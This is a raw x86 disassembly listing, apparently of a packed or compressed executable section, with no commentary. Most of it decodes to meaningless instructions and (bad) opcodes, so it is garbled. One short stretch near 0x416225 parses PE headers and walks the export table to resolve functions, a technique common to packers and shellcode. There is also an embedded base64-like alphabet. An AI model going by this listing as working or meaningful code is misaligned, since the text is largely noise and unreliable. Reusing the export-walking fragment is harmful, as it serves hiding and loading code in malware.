  415dc0:	87 8d 54 f2 51 06    	xchg   %ecx,0x651f254(%ebp)
  415dc6:	0c f1                	or     $0xf1,%al
  415dc8:	26 cd aa             	es int $0xaa
  415dcb:	de f3                	fdivp  %st,%st(3)
  415dcd:	c1 e0 03             	shl    $0x3,%eax
  415dd0:	c3                   	ret
  415dd1:	19 11                	sbb    %edx,(%ecx)
  415dd3:	ba be be 76 06       	mov    $0x676bebe,%edx
  415dd8:	47                   	inc    %edi
  415dd9:	04 45                	add    $0x45,%al
  415ddb:	d7                   	xlat   %ds:(%ebx)
  415ddc:	ae                   	scas   %es:(%edi),%al
  415ddd:	65 a7                	cmpsl  %es:(%edi),%gs:(%esi)
  415ddf:	65 b4 ff             	gs mov $0xff,%ah
  415de2:	38 91 9f e3 e4 48    	cmp    %dl,0x48e4e39f(%ecx)
  415de8:	23 39                	and    (%ecx),%edi
  415dea:	2c 62                	sub    $0x62,%al
  415dec:	7e 48                	jle    0x415e36
  415dee:	62 59 c0             	bound  %ebx,-0x40(%ecx)
  415df1:	66 21 57 54          	and    %dx,0x54(%edi)
  415df5:	f3 00 39             	repz add %bh,(%ecx)
  415df8:	b0 55                	mov    $0x55,%al
  415dfa:	77 a0                	ja     0x415d9c
  415dfc:	91                   	xchg   %eax,%ecx
  415dfd:	0d ac f1 89 7c       	or     $0x7c89f1ac,%eax
  415e02:	29 71 57             	sub    %esi,0x57(%ecx)
  415e05:	4a                   	dec    %edx
  415e06:	42                   	inc    %edx
  415e07:	c3                   	ret
  415e08:	6a 17                	push   $0x17
  415e0a:	e4 60                	in     $0x60,%al
  415e0c:	fe 46 3f             	incb   0x3f(%esi)
  415e0f:	71 75                	jno    0x415e86
  415e11:	f4                   	hlt
  415e12:	c1 f8 03             	sar    $0x3,%eax
  415e15:	45                   	inc    %ebp
  415e16:	f4                   	hlt
  415e17:	d1 e8                	shr    $1,%eax
  415e19:	5b                   	pop    %ebx
  415e1a:	f4                   	hlt
  415e1b:	90                   	nop
  415e1c:	72 28                	jb     0x415e46
  415e1e:	d9 ff                	fcos
  415e20:	55                   	push   %ebp
  415e21:	85 7c 2d 1e          	test   %edi,0x1e(%ebp,%ebp,1)
  415e25:	f2 74 11             	bnd je 0x415e39
  415e28:	4e                   	dec    %esi
  415e29:	d6                   	salc
  415e2a:	7f f0                	jg     0x415e1c
  415e2c:	5a                   	pop    %edx
  415e2d:	56                   	push   %esi
  415e2e:	23 c5                	and    %ebp,%eax
  415e30:	da 7c 20 8f          	fidivrl -0x71(%eax,%eiz,1)
  415e34:	23 d8                	and    %eax,%ebx
  415e36:	3b 62 ed             	cmp    -0x13(%edx),%esp
  415e39:	ea 76 fb 75 05 89 75 	ljmp   $0x7589,$0x575fb76
  415e40:	29 08                	sub    %ecx,(%eax)
  415e42:	3b 04 75 03 71 43 4e 	cmp    0x4e437103(,%esi,2),%eax
  415e49:	9a 6b 7a bb 23 7d b7 	lcall  $0xb77d,$0x23bb7a6b
  415e50:	0d f8 7e 11 86       	or     $0x86117ef8,%eax
  415e55:	50                   	push   %eax
  415e56:	2c 6d                	sub    $0x6d,%al
  415e58:	a1 37 17 cf 2d       	mov    0x2dcf1737,%eax
  415e5d:	52                   	push   %edx
  415e5e:	b0 b0                	mov    $0xb0,%al
  415e60:	30 f4                	xor    %dh,%ah
  415e62:	7c 85                	jl     0x415de9
  415e64:	fc                   	cld
  415e65:	fb                   	sti
  415e66:	13 ea                	adc    %edx,%ebp
  415e68:	d0 cd                	ror    $1,%ch
  415e6a:	2d d6 c1 e2 03       	sub    $0x3e2c1d6,%eax
  415e6f:	8d                   	lea    (bad),%ecx
  415e70:	cf                   	iret
  415e71:	60                   	pusha
  415e72:	d2 5f 41             	rcrb   %cl,0x41(%edi)
  415e75:	93                   	xchg   %eax,%ebx
  415e76:	89 73 10             	mov    %esi,0x10(%ebx)
  415e79:	7f fc                	jg     0x415e77
  415e7b:	75 16                	jne    0x415e93
  415e7d:	eb b1                	jmp    0x415e30
  415e7f:	06                   	push   %es
  415e80:	e9 e1 c3 1b 8b       	jmp    0x8b5d2266
  415e85:	0c cb                	or     $0xcb,%al
  415e87:	88 b4 40 c3 98 5a d1 	mov    %dh,-0x2ea5673d(%eax,%eax,2)
  415e8e:	d9 8f 8f 42 7c bb    	(bad) -0x4483bd71(%edi)
  415e94:	ba 74 b8 e4 7c       	mov    $0x7ce4b874,%edx
  415e99:	e3 20                	jecxz  0x415ebb
  415e9b:	37                   	aaa
  415e9c:	30 19                	xor    %bl,(%ecx)
  415e9e:	e2 22                	loop   0x415ec2
  415ea0:	70 01                	jo     0x415ea3
  415ea2:	7e 1c                	jle    0x415ec0
  415ea4:	15 3b d0 c0 56       	adc    $0x56c0d03b,%eax
  415ea9:	6e                   	outsb  %ds:(%esi),(%dx)
  415eaa:	49                   	dec    %ecx
  415eab:	5f                   	pop    %edi
  415eac:	86 79 02             	xchg   %bh,0x2(%ecx)
  415eaf:	e0 96                	loopne 0x415e47
  415eb1:	fe                   	(bad)
  415eb2:	67 13 f1             	addr16 adc %ecx,%esi
  415eb5:	63 87 e4 25 27 d4    	arpl   %eax,-0x2bd8da1c(%edi)
  415ebb:	c7 f8 63 d4 c7 81    	xbegin 0x82093324
  415ec1:	25 23 36 50 64       	and    $0x64503623,%eax
  415ec6:	f7 0b ca 8a e6 b0    	testl  $0xb0e68aca,(%ebx)
  415ecc:	13 62 1c             	adc    0x1c(%edx),%esp
  415ecf:	9b                   	fwait
  415ed0:	52                   	push   %edx
  415ed1:	bc 52 bc 1c 65       	mov    $0x651cbc52,%esp
  415ed6:	63 30                	arpl   %esi,(%eax)
  415ed8:	58                   	pop    %eax
  415ed9:	d4 0d                	aam    $0xd
  415edb:	bf 1c 10 09 54       	mov    $0x5409101c,%edi
  415ee0:	52                   	push   %edx
  415ee1:	65 67 c5 72 79       	lds    %gs:0x79(%bp,%si),%esi
  415ee6:	53                   	push   %ebx
  415ee7:	72 55                	jb     0x415f3e
  415ee9:	4b                   	dec    %ebx
  415eea:	3c 99                	cmp    $0x99,%al
  415eec:	09 8e 5c 0b ba 0e    	or     %ecx,0xeba0b5c(%esi)
  415ef2:	9a 29 1f 03 cb 0e 03 	lcall  $0x30e,$0xcb031f29
  415ef9:	10 1d 09 ba 69 12    	adc    %bl,0x1269ba09
  415eff:	14 eb                	adc    $0xeb,%al
  415f01:	18 7e b8             	sbb    %bh,-0x48(%esi)
  415f04:	02 05 ed 8c 8c 05    	add    0x58c8ced,%al
  415f0a:	04 03                	add    $0x3,%al
  415f0c:	31 8d 68 81 78 77    	xor    %ecx,0x77788168(%ebp)
  415f12:	fb                   	sti
  415f13:	03 f8                	add    %eax,%edi
  415f15:	d9 b6 76 54 71 04    	fnstenv 0x4715476(%esi)
  415f1b:	b0 29                	mov    $0x29,%al
  415f1d:	14 08                	adc    $0x8,%al
  415f1f:	04 7a                	add    $0x7a,%al
  415f21:	55                   	push   %ebp
  415f22:	66 b9 03 eb          	mov    $0xeb03,%cx
  415f26:	0b 03                	or     (%ebx),%eax
  415f28:	43                   	inc    %ebx
  415f29:	26 06                	es push %es
  415f2b:	12 45 07             	adc    0x7(%ebp),%al
  415f2e:	ee                   	out    %al,(%dx)
  415f2f:	b2 f1                	mov    $0xf1,%dl
  415f31:	48                   	dec    %eax
  415f32:	34 55                	xor    $0x55,%al
  415f34:	ce                   	into
  415f35:	80 72 56 30          	xorb   $0x30,0x56(%edx)
  415f39:	c7                   	(bad)
  415f3a:	25 5a e1 2f bc       	and    $0xbc2fe15a,%eax
  415f3f:	3f                   	aas
  415f40:	00 0f                	add    %cl,(%edi)
  415f42:	00 c6                	add    %al,%dh
  415f44:	46                   	inc    %esi
  415f45:	58                   	pop    %eax
  415f46:	11 8a b8 a8 94 44    	adc    %ecx,0x4494a8b8(%edx)
  415f4c:	89 80 29 c6 06 16    	mov    %eax,0x1606c629(%eax)
  415f52:	4b                   	dec    %ebx
  415f53:	37                   	aaa
  415f54:	00 16                	add    %dl,(%esi)
  415f56:	8f 82 55 0a 7b c9    	pop    -0x3684f5ab(%edx)
  415f5c:	8e 25 85 8b f4 e2    	mov    0xe2f48b85,%fs
  415f62:	16                   	push   %ss
  415f63:	96                   	xchg   %eax,%esi
  415f64:	f5                   	cmc
  415f65:	92                   	xchg   %eax,%edx
  415f66:	87 14 1e             	xchg   %edx,(%esi,%ebx,1)
  415f69:	b8 65 c4 65 1a       	mov    $0x1a65c465,%eax
  415f6e:	a1 8f 62 4e a4       	mov    0xa44e628f,%eax
  415f73:	55                   	push   %ebp
  415f74:	a9 c0 e4 04 52       	test   $0x5204e4c0,%eax
  415f79:	b8 7f 0a bf 65       	mov    $0x65bf0a7f,%eax
  415f7e:	38 9a 14 81 07 5f    	cmp    %bl,0x5f078114(%edx)
  415f84:	0e                   	push   %cs
  415f85:	69 e7 5a 11 28 20    	imul   $0x2028115a,%edi,%esp
  415f8b:	55                   	push   %ebp
  415f8c:	44                   	inc    %esp
  415f8d:	43                   	inc    %ebx
  415f8e:	1d 10 96 4a 6f       	sbb    $0x6f4a9610,%eax
  415f93:	49                   	dec    %ecx
  415f94:	6e                   	outsb  %ds:(%esi),(%dx)
  415f95:	76 61                	jbe    0x415ff8
  415f97:	b4 b8                	mov    $0xb8,%ah
  415f99:	72 87                	jb     0x415f22
  415f9b:	45                   	inc    %ebp
  415f9c:	43                   	inc    %ebx
  415f9d:	88 7f 20             	mov    %bh,0x20(%edi)
  415fa0:	74 79                	je     0x41601b
  415fa2:	70 65                	jo     0x416009
  415fa4:	2e 20 f0             	cs and %dh,%al
  415fa7:	9d                   	popf
  415fa8:	d8 01                	fadds  (%ecx)
  415faa:	35 af 43 eb 21       	xor    $0x21eb43af,%eax
  415faf:	80 da 4f             	sbb    $0x4f,%dl
  415fb2:	8c 3d 46 b4 b4 eb    	mov    %?,0xebb4b446
  415fb8:	06                   	push   %es
  415fb9:	07                   	pop    %es
  415fba:	c4                   	(bad)
  415fbb:	d0 04 46             	rolb   $1,(%esi,%eax,2)
  415fbe:	84 0a                	test   %cl,(%edx)
  415fc0:	00 f7                	add    %dh,%bh
  415fc2:	13 67 fa             	adc    -0x6(%edi),%esp
  415fc5:	44                   	inc    %esp
  415fc6:	30 23                	xor    %ah,(%ebx)
  415fc8:	9b                   	fwait
  415fc9:	c0 74 1a 28 68       	shlb   $0x68,0x28(%edx,%ebx,1)
  415fce:	cf                   	iret
  415fcf:	c6                   	(bad)
  415fd0:	67 0a 32             	or     (%bp,%si),%dh
  415fd3:	c6 43 0b d9          	movb   $0xd9,0xb(%ebx)
  415fd7:	c2 8a 70             	ret    $0x708a
  415fda:	db 2c 8f             	fldt   (%edi,%ecx,4)
  415fdd:	14 18                	adc    $0x18,%al
  415fdf:	04 eb                	add    $0xeb,%al
  415fe1:	b9 1e 4b 64 9f       	mov    $0x9f644b1e,%ecx
  415fe6:	61                   	popa
  415fe7:	2b 28                	sub    (%eax),%ebp
  415fe9:	31 8b 0d ed 04 b0    	xor    %ecx,-0x4ffb12f3(%ebx)
  415fef:	29 6a a6             	sub    %ebp,-0x5a(%edx)
  415ff2:	42                   	inc    %edx
  415ff3:	bf 13 34 97 00       	mov    $0x973413,%edi
  415ff8:	47                   	inc    %edi
  415ff9:	18 92 e3 50 88 4d    	sbb    %dl,0x4d8850e3(%edx)
  415fff:	1c b2                	sbb    $0xb2,%al
  416001:	09 4e 22             	or     %ecx,0x22(%esi)
  416004:	e1 9d                	loope  0x415fa3
  416006:	67 45                	addr16 inc %ebp
  416008:	04 27                	add    $0x27,%al
  41600a:	9c                   	pushf
  41600b:	a2 7f 36 54 10       	mov    %al,0x1054367f
  416010:	6e                   	outsb  %ds:(%esi),(%dx)
  416011:	89 6a 51             	mov    %ebp,0x51(%edx)
  416014:	ab                   	stos   %eax,%es:(%edi)
  416015:	12 17                	adc    (%edi),%dl
  416017:	15 cc ee 3d 98       	adc    $0x983deecc,%eax
  41601c:	ba 04 c1 2e 0c       	mov    $0xc2ec104,%edx
  416021:	83 89 5a fa 43 71 06 	orl    $0x6,0x7143fa5a(%ecx)
  416028:	83 7d f4 50          	cmpl   $0x50,-0xc(%ebp)
  41602c:	2a 40 92             	sub    -0x6e(%eax),%al
  41602f:	60                   	pusha
  416030:	28 94 55 66 71 05 8d 	sub    %dl,-0x72fa8e9a(%ebp,%edx,2)
  416037:	9d                   	popf
  416038:	d0 4a e2             	rorb   $1,-0x1e(%edx)
  41603b:	80 c9 cc             	or     $0xcc,%cl
  41603e:	24 aa                	and    $0xaa,%al
  416040:	04 bf                	add    $0xbf,%al
  416042:	a8 94                	test   $0x94,%al
  416044:	45                   	inc    %ebp
  416045:	fe                   	(bad)
  416046:	eb 32                	jmp    0x41607a
  416048:	b8 6e 32 84 bd       	mov    $0xbd84326e,%eax
  41604d:	d9 2f                	fldcw  (%edi)
  41604f:	01 33                	add    %esi,(%ebx)
  416051:	bc fc 8d 97 6d       	mov    $0x6d978dfc,%esp
  416056:	67 fe                	addr16 (bad)
  416058:	30 83 7e b9 0f 95    	xor    %al,-0x6af04682(%ebx)
  41605e:	c0 84 d8 74 15 ae 11 	rolb   $0x1b,0x11ae1574(%eax,%ebx,8)
  416065:	1b 
  416066:	8a 76 c1             	mov    -0x3f(%esi),%dh
  416069:	b5 33                	mov    $0x33,%ch
  41606b:	07                   	pop    %es
  41606c:	5c                   	pop    %esp
  41606d:	f2 f7 f4             	repnz div %esp
  416070:	4d                   	dec    %ebp
  416071:	6c                   	insb   (%dx),%es:(%edi)
  416072:	41                   	inc    %ecx
  416073:	4d                   	dec    %ebp
  416074:	c9                   	leave
  416075:	c3                   	ret
  416076:	80 5c 63 a4 67       	sbbb   $0x67,-0x5c(%ebx,%eiz,2)
  41607b:	8a 1f                	mov    (%edi),%bl
  41607d:	11 90 a2 55 e3 ef    	adc    %edx,-0x101caa5e(%eax)
  416083:	5c                   	pop    %esp
  416084:	74 f5                	je     0x41607b
  416086:	88 28                	mov    %ch,(%eax)
  416088:	1b 90 fa 41 2e 00    	sbb    0x2e41fa(%eax),%edx
  41608e:	74 9f                	je     0x41602f
  416090:	c5 48 08             	lds    0x8(%eax),%ecx
  416093:	00 ab dc ab dc 45    	add    %ch,0x45dcabdc(%ebx)
  416099:	04 ab                	add    $0xab,%al
  41609b:	7f ae                	jg     0x41604b
  41609d:	46                   	inc    %esi
  41609e:	9e                   	sahf
  41609f:	b1 12                	mov    $0x12,%cl
  4160a1:	31 d1                	xor    %edx,%ecx
  4160a3:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4160a4:	d4 c3                	aam    $0xc3
  4160a6:	c2 c0 0f             	ret    $0xfc0
  4160a9:	26 12 33             	adc    %es:(%ebx),%dh
  4160ac:	ac                   	lods   %ds:(%esi),%al
  4160ad:	88 45 8d             	mov    %al,-0x73(%ebp)
  4160b0:	96                   	xchg   %eax,%esi
  4160b1:	51                   	push   %ecx
  4160b2:	30 2b                	xor    %ch,(%ebx)
  4160b4:	93                   	xchg   %eax,%ebx
  4160b5:	13 17                	adc    (%edi),%edx
  4160b7:	1d 1d 0c f4 57       	sbb    $0x57f40c1d,%eax
  4160bc:	b8 76 06 54 4a       	mov    $0x4a540676,%eax
  4160c1:	c2 17 a8             	ret    $0xa817
  4160c4:	31 c8                	xor    %ecx,%eax
  4160c6:	ff 59 5a             	lcall  *0x5a(%ecx)
  4160c9:	d3 a9 9d 54 a7 bf    	shrl   %cl,-0x4058ab63(%ecx)
  4160cf:	31 40 65             	xor    %eax,0x65(%eax)
  4160d2:	46                   	inc    %esi
  4160d3:	c4 b1 af 9e 65 6b    	les    0x6b659eaf(%ecx),%esi
  4160d9:	d7                   	xlat   %ds:(%ebx)
  4160da:	39 58 e8             	cmp    %ebx,-0x18(%eax)
  4160dd:	ac                   	lods   %ds:(%esi),%al
  4160de:	eb 58                	jmp    0x416138
  4160e0:	46                   	inc    %esi
  4160e1:	bf 01 ea a3 d5       	mov    $0xd5a3ea01,%edi
  4160e6:	24 0b                	and    $0xb,%al
  4160e8:	b6 2e                	mov    $0x2e,%dh
  4160ea:	57                   	push   %edi
  4160eb:	fb                   	sti
  4160ec:	06                   	push   %es
  4160ed:	7e 14                	jle    0x416103
  4160ef:	c7                   	(bad)
  4160f0:	31 86 fd 00 0e 53    	xor    %eax,0x530e00fd(%esi)
  4160f6:	91                   	xchg   %eax,%ecx
  4160f7:	8b 07                	mov    (%edi),%eax
  4160f9:	42                   	inc    %edx
  4160fa:	2d b9 f6 cf 28       	sub    $0x28cff6b9,%eax
  4160ff:	59                   	pop    %ecx
  416100:	60                   	pusha
  416101:	80 3c 24 01          	cmpb   $0x1,(%esp)
  416105:	7e 05                	jle    0x41610c
  416107:	eb 17                	jmp    0x416120
  416109:	c7 46 02 82 1d e0 d0 	movl   $0xd0e01d82,0x2(%esi)
  416110:	d4 2e                	aam    $0x2e
  416112:	9c                   	pushf
  416113:	cc                   	int3
  416114:	f0 3e d8 eb          	lock ds fsubr %st(3),%st
  416118:	12 2b                	adc    (%ebx),%ch
  41611a:	55                   	push   %ebp
  41611b:	c8 eb 07 13          	enter  $0x7eb,$0x13
  41611f:	35 cc 15 7c 81       	xor    $0x817c15cc,%eax
  416124:	e0 51                	loopne 0x416177
  416126:	12 6a 04             	adc    0x4(%edx),%ch
  416129:	6a 03                	push   $0x3
  41612b:	82 02 14             	addb   $0x14,(%edx)
  41612e:	33 8b 8e c7 ee 57    	xor    0x57eec78e(%ebx),%ecx
  416134:	70 4b                	jo     0x416181
  416136:	9f                   	lahf
  416137:	bc 55 18 54 7c       	mov    $0x7c541855,%esp
  41613c:	98                   	cwtl
  41613d:	06                   	push   %es
  41613e:	84 86 ea 45 0c 50    	test   %al,0x500c45ea(%esi)
  416144:	30 56 2c             	xor    %dl,0x2c(%esi)
  416147:	43                   	inc    %ebx
  416148:	c8 18 99 4e          	enter  $0x9918,$0x4e
  41614c:	dc 15 12 69 09 0f    	fcoml  0xf096912
  416152:	e0 31                	loopne 0x416185
  416154:	55                   	push   %ebp
  416155:	b4 ed                	mov    $0xed,%ah
  416157:	8b 36                	mov    (%esi),%esi
  416159:	f8                   	clc
  41615a:	b0 cc                	mov    $0xcc,%al
  41615c:	1f                   	pop    %ds
  41615d:	df 20                	fbld   (%eax)
  41615f:	73 65                	jae    0x4161c6
  416161:	ab                   	stos   %eax,%es:(%edi)
  416162:	64 49                	fs dec %ecx
  416164:	9a 41 83 83 aa 61 1f 	lcall  $0x1f61,$0xaa838341
  41616b:	00 49 7a             	add    %cl,0x7a(%ecx)
  41616e:	77 07                	ja     0x416177
  416170:	0c 8d                	or     $0x8d,%al
  416172:	90                   	nop
  416173:	ed                   	in     (%dx),%eax
  416174:	50                   	push   %eax
  416175:	75 71                	jne    0x4161e8
  416177:	57                   	push   %edi
  416178:	fa                   	cli
  416179:	71 c6                	jno    0x416141
  41617b:	06                   	push   %es
  41617c:	4b                   	dec    %ebx
  41617d:	1e                   	push   %ds
  41617e:	b9 d4 ce ba c8       	mov    $0xc8baced4,%ecx
  416183:	de 8a 22 98 88 52    	fimuls 0x52889822(%edx)
  416189:	ae                   	scas   %es:(%edi),%al
  41618a:	90                   	nop
  41618b:	81 ac dd 47 88 02 16 	subl   $0x2936783,0x16028847(%ebp,%ebx,8)
  416192:	83 67 93 02 
  416196:	16                   	push   %ss
  416197:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  416198:	17                   	pop    %ss
  416199:	4c                   	dec    %esp
  41619a:	84 4c 72 c9          	test   %cl,-0x37(%edx,%esi,2)
  41619e:	6e                   	outsb  %ds:(%esi),(%dx)
  41619f:	6a f8                	push   $0xfffffff8
  4161a1:	f8                   	clc
  4161a2:	26 e9 5b c9 f8 bf    	es jmp 0xc03a2b03
  4161a8:	fc                   	cld
  4161a9:	40                   	inc    %eax
  4161aa:	f8                   	clc
  4161ab:	79 08                	jns    0x4161b5
  4161ad:	90                   	nop
  4161ae:	40                   	inc    %eax
  4161af:	51                   	push   %ecx
  4161b0:	75 6a                	jne    0x41621c
  4161b2:	c4 2c 70             	les    (%eax,%esi,2),%ebp
  4161b5:	29 cd                	sub    %ecx,%ebp
  4161b7:	03 b5 58 9f 1f 0b    	add    0xb1f9f58(%ebp),%esi
  4161bd:	59                   	pop    %ecx
  4161be:	e4 06                	in     $0x6,%al
  4161c0:	53                   	push   %ebx
  4161c1:	44                   	inc    %esp
  4161c2:	09 97 3c 30 30 38    	or     %edx,0x3830303c(%edi)
  4161c8:	cf                   	iret
  4161c9:	c1 6a d8 91          	shrl   $0x91,-0x28(%edx)
  4161cd:	23 79 20             	and    0x20(%ecx),%edi
  4161d0:	c8 6a d8 ee          	enter  $0xd86a,$0xee
  4161d4:	ee                   	out    %al,(%dx)
  4161d5:	56                   	push   %esi
  4161d6:	73 37                	jae    0x41620f
  4161d8:	61                   	popa
  4161d9:	63 15 e0 0d 89 90    	arpl   %edx,0x90890de0
  4161df:	c4 b9 8d 8c 8c 6c    	les    0x6c8c8c8d(%ecx),%edi
  4161e5:	0b e4                	or     %esp,%esp
  4161e7:	b4 e8                	mov    $0xe8,%ah
  4161e9:	b8 02 4c 82 07       	mov    $0x7824c02,%eax
  4161ee:	31 4b 7d             	xor    %ecx,0x7d(%ebx)
  4161f1:	bf b1 c7 fe 53       	mov    $0x53fec7b1,%edi
  4161f6:	52                   	push   %edx
  4161f7:	31 d2                	xor    %edx,%edx
  4161f9:	68 d4 6b 32 89       	push   $0x89326bd4
  4161fe:	25 3b 2d 35 c7       	and    $0xc7352d3b,%eax
  416203:	05 ee 1b e0 7e       	add    $0x7ee01bee,%eax
  416208:	2f                   	das
  416209:	a0 6b 18 91 7d       	mov    0x7d91186b,%al
  41620e:	08 b9 96 38 bf 10    	or     %bh,0x10bf3896(%ecx)
  416214:	77 04                	ja     0x41621a
  416216:	d5 89                	aad    $0x89
  416218:	f9                   	stc
  416219:	2b d6                	sub    %esi,%edx
  41621b:	55                   	push   %ebp
  41621c:	0c 66                	or     $0x66,%al
  41621e:	81 3a f9 bf dd fe    	cmpl   $0xfeddbff9,(%edx)
  416224:	4d                   	dec    %ebp
  416225:	5a                   	pop    %edx
  416226:	75 56                	jne    0x41627e
  416228:	03 52 3c             	add    0x3c(%edx),%edx
  41622b:	08 50 45             	or     %dl,0x45(%eax)
  41622e:	1b 75 4b             	sbb    0x4b(%ebp),%esi
  416231:	8b 52 78             	mov    0x78(%edx),%edx
  416234:	09 d2                	or     %edx,%edx
  416236:	74 44                	je     0x41627c
  416238:	03 7b 09             	add    0x9(%ebx),%edi
  41623b:	2a 7c 8b 5a          	sub    0x5a(%ebx,%ecx,4),%bh
  41623f:	20 03                	and    %al,(%ebx)
  416241:	bd 0f 3b 03 7d       	mov    $0x7d033b0f,%ebp
  416246:	0c fe                	or     $0xfe,%al
  416248:	9b                   	fwait
  416249:	8a 7f 75             	mov    0x75(%edi),%bh
  41624c:	08 51 f3             	or     %dl,-0xd(%ecx)
  41624f:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  416250:	59                   	pop    %ecx
  416251:	74 c2                	je     0x416215
  416253:	40                   	inc    %eax
  416254:	3b 42 18             	cmp    0x18(%edx),%eax
  416257:	72 e9                	jb     0x416242
  416259:	eb 20                	jmp    0x41627b
  41625b:	d1 04 ad c5 85 e2 42 	roll   $1,0x42e285c5(,%ebp,4)
  416262:	24 b6                	and    $0xb6,%al
  416264:	44                   	inc    %esp
  416265:	b6 90                	mov    $0x90,%dh
  416267:	0b 1a                	or     (%edx),%ebx
  416269:	c4 23                	les    (%ebx),%esp
  41626b:	f2 02 10             	repnz add (%eax),%dl
  41626e:	99                   	cltd
  41626f:	20 d7                	and    %dl,%bh
  416271:	cc                   	int3
  416272:	1c 0f                	sbb    $0xf,%al
  416274:	04 4a                	add    $0x4a,%al
  416276:	61                   	popa
  416277:	8b da                	mov    %edx,%ebx
  416279:	a0 95 97 02 e2       	mov    0xe2029795,%al
  41627e:	5a                   	pop    %edx
  41627f:	31 1c 84             	xor    %ebx,(%esp,%eax,4)
  416282:	87 42 f6             	xchg   %eax,-0xa(%edx)
  416285:	f4                   	hlt
  416286:	90                   	nop
  416287:	17                   	pop    %ss
  416288:	d9 6b 23             	fldcw  0x23(%ebx)
  41628b:	79 20                	jns    0x4162ad
  41628d:	97                   	xchg   %eax,%edi
  41628e:	dc e0                	fsub   %st,%st(0)
  416290:	6b ff 37             	imul   $0x37,%edi,%edi
  416293:	1f                   	pop    %ds
  416294:	91                   	xchg   %eax,%ecx
  416295:	dc 2b                	fsubrl (%ebx)
  416297:	3e 30 31             	xor    %dh,%ds:(%ecx)
  41629a:	32 33                	xor    (%ebx),%dh
  41629c:	34 35                	xor    $0x35,%al
  41629e:	36 37                	ss aaa
  4162a0:	38 39                	cmp    %bh,(%ecx)
  4162a2:	41                   	inc    %ecx
  4162a3:	b4 f0                	mov    $0xf0,%ah
  4162a5:	ff                   	(bad)
  4162a6:	ff 42 43             	incl   0x43(%edx)
  4162a9:	44                   	inc    %esp
  4162aa:	45                   	inc    %ebp
  4162ab:	46                   	inc    %esi
  4162ac:	47                   	inc    %edi
  4162ad:	48                   	dec    %eax
  4162ae:	49                   	dec    %ecx
  4162af:	4a                   	dec    %edx
  4162b0:	4b                   	dec    %ebx
  4162b1:	4c                   	dec    %esp
  4162b2:	4d                   	dec    %ebp
  4162b3:	4e                   	dec    %esi
  4162b4:	4f                   	dec    %edi
  4162b5:	50                   	push   %eax
  4162b6:	51                   	push   %ecx
  4162b7:	52                   	push   %edx
  4162b8:	53                   	push   %ebx
  4162b9:	54                   	push   %esp
  4162ba:	55                   	push   %ebp
  4162bb:	0b 58 f1             	or     -0xf(%eax),%ebx
  4162be:	ff 0b                	decl   (%ebx)
  4162c0:	bd e8 61 62 63       	mov    $0x636261e8,%ebp
  4162c5:	73 76                	jae    0x41633d
  4162c7:	67 68 69 6a 6b 6c    	addr16 push $0x6c6b6a69
  4162cd:	6d                   	insl   (%dx),%es:(%edi)
  4162ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4162cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4162d0:	70 71                	jo     0x416343
  4162d2:	72 bf                	jb     0x416293
  4162d4:	fd                   	std
  4162d5:	b7 bf                	mov    $0xbf,%bh
  4162d7:	5d                   	pop    %ebp
  4162d8:	75 76                	jne    0x416350
  4162da:	77 78                	ja     0x416354
  4162dc:	79 7a                	jns    0x416358
  4162de:	3f                   	aas
  4162df:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4162e0:	d6                   	salc
  4162e1:	c9                   	leave
  4162e2:	c5 d8 c9             	(bad)
  4162e5:	a8 cd                	test   $0xcd,%al
  4162e7:	06                   	push   %es
  4162e8:	c7                   	(bad)
  4162e9:	d8 d3                	fcom   %st(3)
  4162eb:	d6                   	salc
  4162ec:	dd fb                	(bad)
  4162ee:	85 f6                	test   %esi,%esi
  4162f0:	ff a5 90 ab c9 d8    	jmp    *-0x27365470(%ebp)
  4162f6:	b0 c5                	mov    $0xc5,%al
  4162f8:	d7                   	xlat   %ds:(%ebx)
  4162f9:	d8 a9 d6 d6 0e 57    	fsubrs 0x570ed6d6(%ecx)
  4162ff:	c9                   	leave
  416300:	d6                   	salc
  416301:	d1 cd                	ror    $1,%ebp
  416303:	d2 20                	shlb   %cl,(%eax)
  416305:	ff b0 ff ad b4 0d    	push   0xdb4adff(%eax)
  41630b:	c7                   	(bad)
  41630c:	c9                   	leave
  41630d:	d7                   	xlat   %ds:(%ebx)
  41630e:	d7                   	xlat   %ds:(%ebx)
  41630f:	90                   	nop
  416310:	b3 d4                	mov    $0xd4,%bl
  416312:	c9                   	leave
  416313:	d2 0b                	rorb   %cl,(%ebx)
  416315:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  416316:	d0 d3                	rcl    $1,%bl
  416318:	d7                   	xlat   %ds:(%ebx)
  416319:	c9                   	leave
  41631a:	ac                   	lods   %ds:(%esi),%al
  41631b:	db da                	fcmovnu %st(2),%st
  41631d:	83 fd c5             	cmp    $0xffffffc5,%ebp
  416320:	d2 c8                	ror    %cl,%al
  416322:	d0 c9                	ror    $1,%cl
  416324:	90                   	nop
  416325:	13 97 96 aa 49 3c    	adc    0x3c49aa96(%edi),%edx
  41632b:	90                   	nop
  41632c:	55                   	push   %ebp
  41632d:	f6 db                	neg    %bl
  41632f:	f6 3f                	idivb  (%edi)
  416331:	b8 d3 d3 d0 cc       	mov    $0xccd0d3d3,%eax
  416336:	c9                   	leave
  416337:	d0 d4                	rcl    $1,%ah
  416339:	15 b7 43 d4 d7       	adc    $0xd7d443b7,%eax
  41633e:	cc                   	int3
  41633f:	d3 d8                	rcr    %cl,%eax
  416341:	27                   	daa
  416342:	6d                   	insl   (%dx),%es:(%edi)
  416343:	db 6f 5f             	fldt   0x5f(%edi)
  416346:	b2 c9                	mov    $0xc9,%dl
  416348:	dc 0d bb c5 cd d8    	fmull  0xd8cdc5bb
  41634e:	aa                   	stos   %al,%es:(%edi)
  41634f:	66 b7 62             	data16 mov $0x62,%bh
  416352:	cb                   	lret
  416353:	b6 1d                	mov    $0x1d,%dh
  416355:	cc                   	int3
  416356:	bd 43 b3 c6 ce       	mov    $0xcec6b343,%ebp
  41635b:	83 3a b1             	cmpl   $0xffffffb1,(%edx)
  41635e:	d9 03                	flds   (%ebx)
  416360:	dc 8c b6 9f fd 36 ba 	fmull  -0x45c90261(%esi,%esi,4)
  416367:	82 d7 cd             	adc    $0xcd,%bh
  41636a:	d3 d2                	rcl    %cl,%edx
  41636c:	a9 0d a8 d6 cd       	test   $0xcdd6a80d,%eax
  416371:	da 57 dd             	ficoml -0x23(%edi)
  416374:	d9 5a fb             	fstps  -0x5(%edx)
